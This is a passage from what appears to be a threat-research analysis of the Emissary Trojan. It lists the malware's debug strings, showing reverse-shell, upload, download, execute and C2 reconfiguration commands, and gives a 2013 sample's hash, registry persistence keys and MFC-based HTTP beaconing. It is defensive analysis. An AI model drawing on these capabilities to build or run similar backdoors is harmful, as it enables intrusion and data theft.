</span>-<span class="crayon-h"> </span><span class="crayon-cn">0x7f</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">RecvShellCmdThread</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">recv</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">Error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x</span><span class="crayon-sy">%</span><span class="crayon-cn">08x</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-11"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x89</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">RecvShellCmdThread</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">WriteFile</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">Error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x</span><span class="crayon-sy">%</span><span class="crayon-cn">08x</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-12"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x8f</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">RecvShellCmdThread</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-e">thread </span><span class="crayon-e">exit</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-13"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xeb</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Error </span><span class="crayon-i">occured</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">%</span><span class="crayon-i">d</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-14"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xfa</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">TerminateThread </span><span class="crayon-e">Input </span><span class="crayon-e">Thread</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-15"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x100</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">TerminateThread </span><span class="crayon-e">Output </span><span class="crayon-e">Thread</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-16"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x118</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">SocketShell</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Fail </span><span class="crayon-st">To</span><span class="crayon-h"> </span><span class="crayon-e">Create </span><span class="crayon-e">Reverse </span><span class="crayon-e">Socket</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-17"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x12f</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">SocketShell</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Fail </span><span class="crayon-st">To</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">Generate </span><span class="crayon-e">Reverse </span><span class="crayon-e">Shell</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-18"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x13a</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">SocketShell</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">SocketShell</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Fail </span><span class="crayon-st">To</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">Generate </span><span class="crayon-e">Reverse </span><span class="crayon-e">Shell</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-19"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x13e</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">SocketShell</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Create </span><span class="crayon-e">Reverse </span><span class="crayon-e">Shell </span><span class="crayon-e">Thread </span><span class="crayon-e">OK</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-20"><span class="crayon-i">config</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x38</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">RegCreateKeyEx </span><span class="crayon-i">error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-cn">0x08x</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-21"><span class="crayon-i">config</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x46</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">RegSetValueEx </span><span class="crayon-i">error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-cn">0x08x</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-22"><span class="crayon-i">config</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x5e</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">ReadConfig</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">RegCreateKeyEx </span><span class="crayon-i">error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x</span><span class="crayon-sy">%</span><span class="crayon-cn">08x</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-23"><span class="crayon-i">config</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x66</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">ReadConfig</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">RegQueryValueEx </span><span class="crayon-i">error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x</span><span class="crayon-sy">%</span><span class="crayon-cn">08x</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-24"><span class="crayon-i">config</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xab</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">find </span><span class="crayon-i">user</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-i">s</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-25"><span class="crayon-i">config</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xbc</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">can </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-e">find </span><span class="crayon-e">proxy</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-26"><span class="crayon-i">config</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xc7</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">get </span><span class="crayon-e">ProxySetting </span><span class="crayon-e">failed</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-27"><span class="crayon-i">config</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xd4</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">find </span><span class="crayon-e">proxy </span><span class="crayon-i">server</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-i">s</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-28"><span class="crayon-i">run</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0x75</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">InitConfig</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-i">g_ServerPath</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">s</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-i">g_ServerName</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">s</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-i">g_port</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">d</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-i">g_ServerUrl</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">s</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-29"><span class="crayon-i">run</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x9d</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">InitConfig</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-i">g_DelayTime</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">d</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-30"><span class="crayon-i">run</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xbe</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">get </span><span class="crayon-e">proxy </span><span class="crayon-e">the </span><span class="crayon-e">last </span><span class="crayon-e">time </span><span class="crayon-i">used</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">s</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-31"><span class="crayon-i">run</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xc3</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">server </span><span class="crayon-i">index</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">d</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-32"><span class="crayon-i">run</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xd9</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">RetryTimes</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-i">d</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-33"><span class="crayon-i">run</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xec</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">connect</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-i">error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">s</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-34"><span class="crayon-i">run</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x10c</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">process</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">request </span><span class="crayon-i">ok</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-35"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x98</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">ASP</span><span class="crayon-sy">.</span><span class="crayon-i">NET_SessionId</span>长度异常<span class="crayon-sy">:</span><span class="crayon-sy">[</span><span class="crayon-sy">%</span><span class="crayon-i">d</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">%</span><span class="crayon-i">s</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">translation</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">ASP</span><span class="crayon-sy">.</span><span class="crayon-e">NET_SessionId </span><span class="crayon-e">Length </span><span class="crayon-i">Exception</span><span class="crayon-sy">:</span><span class="crayon-sy">[</span><span class="crayon-sy">%</span><span class="crayon-i">d</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">%</span><span class="crayon-i">s</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-36"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xd0</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span>******<span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-i">connected</span><span class="crayon-h"> </span><span class="crayon-sy">!</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-37"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xf4</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">read </span><span class="crayon-e">hread </span><span class="crayon-i">error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-i">s</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-38"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x102</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">body </span><span class="crayon-i">length</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-39"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x13d</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">decrypt </span><span class="crayon-i">error</span>"</div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-40"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x211</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">instruction</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-i">instruction</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-41"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x21d</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">no </span><span class="crayon-e">instruction </span><span class="crayon-e">guid</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-42"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x22c</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_DOWNLOAD </span><span class="crayon-e">no </span><span class="crayon-e">local </span><span class="crayon-e">file </span><span class="crayon-e">name</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-43"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x23b</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_UPLoad </span><span class="crayon-e">no </span><span class="crayon-e">local </span><span class="crayon-e">file </span><span class="crayon-e">name</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-44"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x249</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_UPLoad </span><span class="crayon-e">no </span><span class="crayon-e">local </span><span class="crayon-e">file </span><span class="crayon-e">name</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-45"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x242</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_UPLoad </span><span class="crayon-e">no </span><span class="crayon-e">local </span><span class="crayon-e">file </span><span class="crayon-e">name</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-46"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x25b</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_EXECUTE </span><span class="crayon-e">no </span><span class="crayon-e">cmd </span><span class="crayon-e">list</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-47"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x262</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_EXECUTE </span><span class="crayon-e">no </span><span class="crayon-e">timeout</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-48"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x2b4</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_SHELL </span><span class="crayon-e">ip</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-49"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x2bb</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_SHELL </span><span class="crayon-e">port</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-50"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x2dd</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_CHANGECONFIG </span><span class="crayon-e">server1</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-51"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x2e4</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_CHANGECONFIG </span><span class="crayon-e">server2</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-52"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x2eb</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_CHANGECONFIG </span><span class="crayon-e">server3</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-53"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x2f2</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_CHANGECONFIG </span><span class="crayon-e">timestr</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-54"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x2f9</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_CHANGECONFIG </span><span class="crayon-e">namestr</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-55"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x300</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">OP_CHANGECONFIG </span><span class="crayon-e">guid</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-56"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x321</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-e">connected</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-57"><span class="crayon-i">httpclient</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x361</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">send </span><span class="crayon-e">msg </span><span class="crayon-e">error</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-58"><span class="crayon-i">httpdoinstruction</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x28</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">DownloadFile</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">LocalFileName</span>=<span class="crayon-sy">%</span><span class="crayon-i">s</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-59"><span class="crayon-i">httpdoinstruction</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x5c</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">download </span><span class="crayon-e">file </span><span class="crayon-e">http </span><span class="crayon-i">head</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">s</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-60"><span class="crayon-i">httpdoinstruction</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x7a</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">download </span><span class="crayon-e">file </span><span class="crayon-e">ok</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-61"><span class="crayon-i">httpdoinstruction</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xac</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">UploadFile</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">LocalFileName</span>=<span class="crayon-sy">%</span><span class="crayon-i">s</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-62"><span class="crayon-i">httpdoinstruction</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xb4</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">DownloadFile</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">Error</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Open </span><span class="crayon-i">File</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">%</span><span class="crayon-i">S</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-cn">0x</span><span class="crayon-sy">%</span><span class="crayon-cn">08x</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-63"><span class="crayon-i">httpdoinstruction</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0xc7</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">UploadFile</span><span class="crayon-sy">:</span><span class="crayon-i">TotalLength</span>=<span class="crayon-sy">%</span><span class="crayon-i">d</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-64"><span class="crayon-i">httpdoinstruction</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x124</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">download </span><span class="crayon-e">file </span><span class="crayon-e">http </span><span class="crayon-i">head</span><span class="crayon-sy">:</span><span class="crayon-sy">%</span><span class="crayon-i">s</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0018 seconds] -->
<p><strong>Date: 10/24/2013</strong></p>
<p>SHA256: 9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3</p>
<p>Original Name: NetPigeon_DLL.dll</p>
<p>This update to Emissary allowed the Trojan to run as a service. The configuration now contains settings for the Emissary service, which the Trojan will store in and access from the following registry keys:</p>
<p>SOFTWARE\Microsoft\VBA\Serv -&gt; Service Name</p>
<p>SOFTWARE\Microsoft\VBA\VbaList -&gt; Binary Path for the Service</p>
<p>Also, this version of Emissary was created using Microsoft Foundation Classes (MFC) to carry out a majority of its functionality. For instance, instead of manually building an HTTP request as in previous versions, this version uses the MFC functions to create the HTTP request and send it to the C2 server:</p>
<ul>
<li>CInternetSession::CInternetSession</li>
<li>CInternetSession::GetHttpConnection</li>
<li>CHttpConnection::OpenRequest</li>
<li>CHttpFile::AddRequestHeaders</li>
<li>CInternetSession::SetCookie</li>
<li>CHttpFile::SendRequest</li>
</ul>
<p>Using these classes creates a significantly different HTTP request sent to the C2 server, but the functionality of obtaining instructions from the C2 is the same. The following is an example of a beacon generated by this sample, which contains the same "op" value and has additional fields within the HTTP header:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e27265081599" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
